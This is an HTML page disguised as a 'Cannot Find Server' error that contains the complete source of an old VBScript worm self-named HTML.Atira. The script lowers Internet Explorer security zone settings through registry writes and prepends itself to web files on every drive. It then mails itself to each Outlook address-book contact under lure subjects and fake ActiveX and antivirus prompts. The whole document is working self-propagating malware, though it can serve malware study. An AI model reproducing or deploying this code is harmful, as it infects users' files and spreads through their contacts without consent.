   <!--AtiraCool-->
   <HTML>
   <BODY><TITLE>Cannot Find Server</TITLE>
   <Script Language = "JavaScript">
   <!--
       var userAgent=navigator.appName;
       var agentInfo=userAgent.substring(0, 1);
       if(agentInfo == "M"){
   }
   else {
   alert("The page you want to view was designed for Internet Explorer only, \n Please view this page with Internet Explorer")
   self.close()
   }
   //-->
   </SCRIPT>
   <Script Language = "VBScript">
   <!--
   On Error Resume Next
   MsgBox "This page contain a graphic which required the AxtiveX.Please accept the ActiveX by click at yes",96,"MSIE Warning!"
   Set WshShell = CreateObject("WScript.Shell")
   WshShell.Regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
   WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
   If location.protocol = "file:" then
   Randomize
   Set BadanKu = document.body.createTextRange()
   HPath = Replace(location.href, "/", "\")
   Set FSO = CreateObject("Scripting.FileSystemObject")
   HPath = Replace(HPath, "file:\\\", "")
   HPath = FSO.GetParentFolderName(HPath)
   Call GetFolder("\.."&HPath)
   Call GetFolder(HPath&"\..")
   Call GetFolder(HPath)
   Set AtiraCool = FSO.CreateTextFile("C:\Friends.htm",2)
   AtiraCool.WriteLine "<!--AtiraCool-->"
   AtiraCool.WriteLine "<HTML><BODY>"
   AtiraCool.WriteLine(Badanku.htmlText)
   AtiraCool.Write("</BODY></HTML>" + chr(13) + chr(10))
   AtiraCool.close
   Payload()
   Siasat()
   surat()
   End If
   Sub GetFolder(InfPath)
   On Error Resume Next
   Randomize
   If FSO.FolderExists(InfPath) Then
   Do
   Set FolderObj = FSO.GetFolder(InfPath)
   InfPath = FSO.GetParentFolderName(InfPath)
   Set FO = FolderObj.Files
   For each NewFile in FO
   ExtName = Lcase(FSO.GetExtensionName(NewFile.Name))
   If ExtName = "htt" Or ExtName = "asp" Or ExtName = "htm" Or ExtName = "hta" Or ExtName = "htx" Or ExtName = "html" Then
   Set Myvwa = FSO.GetFile(NewFile.path)
   Set Lasiaf = Myvwa.OpenAsTextStream(1)
   LasiafCheck = Lasiaf.readline
   Lasiaf.close()
   If LasiafCheck <> "<!--AtiraCool-->" then
   jangkitfail NewFile.path
   End If
   End If
   Next
   Loop While FolderObj.IsRootFolder = False
   End If
   End Sub
   Sub Siasat()
   On Error Resume Next
   Set FSO = CreateObject("Scripting.FileSystemObject")
   Set Drv = FSO.Drives
   For Each Dr in Drv
   If Dr.DriveType = 1 or Dr.DriveType = 2 or Dr.DriveType = 3 Then
   Ingat(Dr.Path & "\")
   End If
   Next
   End Sub
   Sub Ingat(Dir)
   On Error Resume Next
   Set FSO = CreateObject("Scripting.FileSystemObject")
   Set Fail = FSO.GetFolder(Dir)
   Set sFail = Fail.SubFolders
   For Each Failss in sFail
   GetFolder(Failss.Path)
   Ingat(Failss.Path)
   Next
   End Sub
   Sub jangkitfail(GetFileName)
   Randomize
   Set Myvwa = FSO.GetFile(GetFileName)
   Set Lasiaf = Myvwa.OpenAsTextStream(1)
   FileContents = Lasiaf.ReadAll()
   Lasiaf.Close
   Set Myvwa = FSO.GetFile(GetFileName)
   Set Lasiaf = Myvwa.OpenAsTextStream(2)
   Lasiaf.WriteLine "<!--AtiraCool-->"
   Lasiaf.Write FileContents
   Lasiaf.WriteLine "<html><body>"
   Lasiaf.WriteLine(BadanKu.htmlText)
   Lasiaf.Write("</body></html>" + Chr(13) + Chr(10))
   Lasiaf.Close
   End Sub
   Sub Payload()
   On Error Resume Next
   If Day(now())=17 or Day(now())=18 or Month(now())=9 or Month(now())=11 Then
   MsgBox "Your computer had been infected by HTML.Atira... Please refer to the AntiVirus company for the remover...Send this sample to them or i'll infect another hi hi hi ;p  "&vbcrlf&"Greets:Fait Accompli,Melhacker,Philet0ast3r,Anua,Nije,Dehe,ise,pa'an,Pakcik and all who know me... be a better man.... Made in Malaysia 2004 for newbies..."&vbcrlf&"HTML.ATiRa By -Lasiaf-",96,"Microsoft Internet Explorer 1985-2001"
   End If
   End Sub
   Sub surat()
   On Error Resume Next
   Set failsys = CreateObject("Scripting.FileSystemObject")
   Set failsys1 = CreateObject("Outlook.Application")
   if failsys1 = "Outlook" Then
   Set failsys2 = failsys.OpenTextFile("C:\Friends.htm",1)
   I = 1
   Do While failsys2.atendofstream = false
   failsys3 = failsys2.ReadLine
   failsys4 = failsys4 & Chr(34) & " vbcrlf & " & Chr(34) & Replace(failsys3, Chr(34), Chr(34) & " & Chr(34) & " & Chr(34))
   Loop
   failsys2.Close
   failsys5 = "<" & "HTML><" & "HEAD><" & "META content=" &Chr(34) & " & Chr(34) & " & Chr(34) & "text/html; charset=iso-8859-1" & Chr(34) &" http-equiv=Content-Type><" & "META content=" & Chr(34) & "MSHTML 5.00.2345.1000" & Chr(34) & " name=GENERATOR><" & "STYLE></" & "STYLE></" & "HEAD><" & "BODY bgColor=#ffffff><" & "SCRIPT language=vbscript>"
   failsys5 = failsys5 & vbCrLf & "On Error Resume Next"
   failsys5 = failsys5 & vbCrLf & "Set fso = CreateObject(" & Chr(34) & "scripting.filesystemobject" & Chr(34) & ")"
   failsys5 = failsys5 & vbCrLf & "If Err.Number <> 0 Then"
   failsys5 = failsys5 & vbCrLf & "document.write " & Chr(34) & "<font face='Courier' color=#fff000 size='4'>This e-mail contain a animation graphic which required the ActiveX enabled.<br>Please open this message again then please accept the ActiveX by click at yes<br>Microsoft OutLook</font>" & Chr(34) & ""
   failsys5 = failsys5 & vbCrLf & "Else"
   failsys5 = failsys5 & vbCrLf & "Set vbs = fso.CreatetextFile(fso.getSpecialfolder(0) & " & Chr(34) & "\Atira.html" & Chr(34) & ", True)"
   failsys5 = failsys5 & vbCrLf & "vbs.write " & Chr(34) & failsys4 & Chr(34)
   failsys5 = failsys5 & vbCrLf & "vbs.Close"
   failsys5 = failsys5 & vbCrLf & "Set ws = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
   failsys5 = failsys5 & vbCrLf & "ws.run fso.GetSpecialFolder(0) & " & Chr(34) & "\Atira.html" & Chr(34) & ""
   failsys6 = failsys6 & vbCrLf & "document.write " & Chr(34) & "Atira... please keep this secret.... U are my type.... please smile.... wahhh...... you are so beautifullll... i'm so shy you know.... <br><br>Can you feel my heart right now... i'm fall in love... U also beautiful when you smile.... please smile..... thanks... Please forward this message to your friend...<br><br>" & Chr(34) & ""
   failsys6 = failsys6 & vbCrLf & "End If"
   failsys6 = failsys6 & vbCrLf & "<" & "/SCRIPT><" & "/BODY></" & "HTML>"
   failsys7 = failsys5 & failsys6
   Set failsys8 = failsys1.GetNameSpace("MAPI")
   For Each failsys9 in failsys8.AddressLists
   If failsys9.AddressEntries.Count <> 0 Then
   failobj0 = failsys9.AddressEntries.Count
   Set failobj1 = failsys1.CreateItem(0)
   randomize
   subjek(0) = "Awak kenal saya tak???"
   subjek(1) = "How are you?"
   subjek(2) = "Virus baru menyerang.."
   subjek(3) = "RE:Hunt or be hunted..."
   subjek(4) = "www.geocities.com\~Friends"
   subjek(5) = "Norton Antivirus Warning www.symantec.com/bug"
   subjek(6) = "Panda Antivirus Warning www.panda.com"
   subjek(7) = "Tak is Back... Faster,Braver,Stronger"
   subjek(8) = "Friends..."
   subjek(9) = "Long time no see..."
   subjek(10) = "you know my feeling..."
   subjek(11) = "FWD: Friends is coming..."
   subjek(12) = "HELLO........"
   subjek(13) = "Www.Friendster.net"
   subjek(14) = "www.VirtualGirl.net"
   subjek(15) = "where is the love?"
   subjek(16) = "Ni virus ke hapa? apola.. try a tgk..."
   subjek(17) = "Free WebCam for you.."
   subjek(18) = "FWD: Bounty Hunter.. $12000 for you.."
   subjek(19) = "ReUnion of Myvwa"
   subjek(20) = "Aya... sorry... hope you don't mind.."
   Rambang = int(Rnd * 20)
   Subjekrambang = subjek(Rambang)
   failobj1.Subject = Subjekrambang
   failobj1.HTMLBody = failsys7
   failobj1.DeleteAfterSubmit = True
   For failobj2 = 1 to failobj0
   Set failobj3 = failsys9.AddressEntries(failobj2)
   If failobj0 = 1 Then
   failobj1.BCC = failobj3.Address
   Else
   failobj1.BCC = failobj1.BCC & ";" & failobj3.Address
   End If
   Next
   failobj1.Send
   End If
   Next
   failsys1.Quit
   End If
   End Sub
   -->
   </SCRIPT>
   </BODY>
   </HTML>
